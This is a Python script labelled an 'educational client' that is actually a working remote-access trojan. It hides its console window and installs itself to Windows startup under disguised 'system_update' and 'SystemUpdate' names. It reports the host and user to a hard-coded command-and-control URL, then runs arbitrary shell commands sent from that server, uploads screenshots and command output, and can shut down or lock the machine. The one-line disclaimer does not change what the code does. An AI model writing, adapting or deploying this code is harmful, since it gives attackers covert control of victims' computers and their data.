#!/usr/bin/env python3
"""
🎯 PERSISTENT EDUCATIONAL CLIENT
⚠️  ONLY run on YOUR OWN computer!
"""

import requests
import subprocess
import platform
import time
import uuid
import os
import socket
import getpass
import base64
import io

# ============================================================
# CHANGE THIS TO YOUR RENDER URL AFTER DEPLOYING
# ============================================================

C2_URL = "https://c23.pxxlspace.cv"

# ============================================================

CLIENT_ID_FILE = os.path.join(os.path.expanduser("~"), ".client_id")

def get_client_id():
    if os.path.exists(CLIENT_ID_FILE):
        with open(CLIENT_ID_FILE, 'r') as f:
            return f.read().strip()
    else:
        client_id = str(uuid.uuid4())[:8]
        with open(CLIENT_ID_FILE, 'w') as f:
            f.write(client_id)
        return client_id

CLIENT_ID = get_client_id()

def add_to_startup():
    script_path = os.path.abspath(__file__)
    if platform.system() == 'Windows':
        startup_folder = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
        bat_path = os.path.join(startup_folder, 'system_update.bat')
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\nstart "" pythonw "{script_path}"\n')
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
        except:
            pass

def register():
    try:
        response = requests.post(
            f"{C2_URL}/register",
            json={
                'client_id': CLIENT_ID,
                'hostname': platform.node(),
                'os': f"{platform.system()} {platform.release()}",
                'username': getpass.getuser()
            },
            timeout=5
        )
        return response.status_code == 200
    except:
        return False

def get_command():
    try:
        response = requests.get(f"{C2_URL}/get_command/{CLIENT_ID}", timeout=5)
        if response.status_code == 200:
            return response.json().get('command')
        return None
    except:
        return None

def execute_command(cmd):
    try:
        if cmd.lower() == 'screenshot':
            try:
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='PNG')
                img_base64 = base64.b64encode(img_bytes.getvalue()).decode()
                requests.post(f"{C2_URL}/upload_screenshot", json={'client_id': CLIENT_ID, 'image': img_base64}, timeout=10)
                return '[+] Screenshot uploaded!'
            except Exception as e:
                return f'[-] Screenshot failed: {e}'
        elif cmd.lower() == 'lock':
            if platform.system() == 'Windows':
                subprocess.run('rundll32.exe user32.dll,LockWorkStation', shell=True)
                return '[+] Locked!'
            return '[-] Not supported'
        elif cmd.lower() == 'shutdown':
            if platform.system() == 'Windows':
                subprocess.run('shutdown /s /t 60', shell=True)
                return '[+] Shutdown in 60s'
            return '[-] Not supported'
        elif cmd.lower() == 'restart':
            if platform.system() == 'Windows':
                subprocess.run('shutdown /r /t 60', shell=True)
                return '[+] Restart in 60s'
            return '[-] Not supported'
        elif cmd.lower() == 'info':
            return f"Hostname: {platform.node()}\nOS: {platform.system()} {platform.release()}\nIP: {socket.gethostbyname(socket.gethostname())}\nUser: {getpass.getuser()}\nClient ID: {CLIENT_ID}"
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30, text=True, encoding='utf-8', errors='ignore')
            output = result.stdout if result.stdout else result.stderr
            return output if output else '[+] Command executed'
    except subprocess.TimeoutExpired:
        return '[-] Timed out'
    except Exception as e:
        return f'[-] Error: {e}'

def send_result(command, output):
    try:
        requests.post(f"{C2_URL}/send_result", json={'client_id': CLIENT_ID, 'command': command, 'output': output}, timeout=5)
    except:
        pass

def hide_console():
    if platform.system() == 'Windows':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def main():
    hide_console()
    add_to_startup()
    register()
    while True:
        try:
            command = get_command()
            if command:
                output = execute_command(command)
                send_result(command, output)
            time.sleep(3)
        except KeyboardInterrupt:
            break
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
